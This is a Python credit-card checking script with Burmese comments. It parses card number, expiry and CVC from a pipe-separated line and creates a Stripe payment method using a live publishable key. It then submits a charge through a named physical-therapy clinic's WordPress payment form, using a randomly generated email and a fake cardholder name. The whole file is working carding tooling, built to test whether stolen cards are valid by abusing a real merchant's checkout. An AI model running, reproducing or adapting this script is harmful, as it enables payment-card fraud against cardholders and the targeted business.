import requests, re
import random
import string # Random စာလုံးတွေထုတ်ဖို့ ဒါလေးထပ်ထည့်ထားတယ်

def Tele(ccx):
	ccx = ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]

	if "20" in yy:  # Mo3gza
		yy = yy.split("20")[1]

	r = requests.session()

	random_amount1 = random.randint(1, 4)
	random_amount2 = random.randint(1, 99)

	# 🔥 Random Email Logic (ဒီမှာစပြီး ပြင်ထားတယ်) 🔥
	# စာလုံး ၁၂ လုံးပါတဲ့ Random နာမည်တစ်ခု ဖန်တီးမယ်
	letters = string.ascii_lowercase + string.digits
	random_name = ''.join(random.choice(letters) for i in range(12))
	random_email = f"{random_name}@gmail.com"
	# ==========================================

	headers = {
		'authority': 'api.stripe.com',
		'accept': 'application/json',
		'accept-language': 'en-US,en;q=0.9',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://js.stripe.com',
		'referer': 'https://js.stripe.com/',
		'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51HS2e7IM93QTW3d6EuHHNKQ2lAFoP1sepEHzJ7l1NWvDr7q2vEbmp3v5GM6gwdtgmO3HnEQ3JGeWtZJNXiNEd97M0067w1jUqv'

	try:
		response = requests.post(
			'https://api.stripe.com/v1/payment_methods',
			headers=headers,
			data=data
		)
		pm = response.json()['id']
	except:
		return "Error Creating PM"

	headers = {
		'Accept': 'application/json, text/javascript, */*; q=0.01',
		'Accept-Language': 'en-US,en;q=0.9',
		'Connection': 'keep-alive',
		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'Origin': 'https://farmingdalephysicaltherapywest.com',
		'Referer': 'https://farmingdalephysicaltherapywest.com/make-payment/',
		'Sec-Fetch-Dest': 'empty',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Site': 'same-origin',
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
		'X-Requested-With': 'XMLHttpRequest',
		'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Linux"',
	}

	data = {
		'action': 'wp_full_stripe_inline_payment_charge',
		'wpfs-form-name': 'Payment-Form',
		'wpfs-form-get-parameters': '%7B%7D',
		'wpfs-custom-amount-unique': '1',
		'wpfs-custom-input[]': '13125550124',
		# 🔥 ဒီနေရာမှာ Random Email ကို ထည့်လိုက်ပြီ 🔥
		'wpfs-card-holder-email': random_email,
		'wpfs-card-holder-name': 'Mr Z',
		'wpfs-stripe-payment-method-id': f'{pm}',
	}

	response = requests.post(
		'https://farmingdalephysicaltherapywest.com/wp-admin/admin-ajax.php',
		headers=headers,
		data=data,
	)

	return response.text
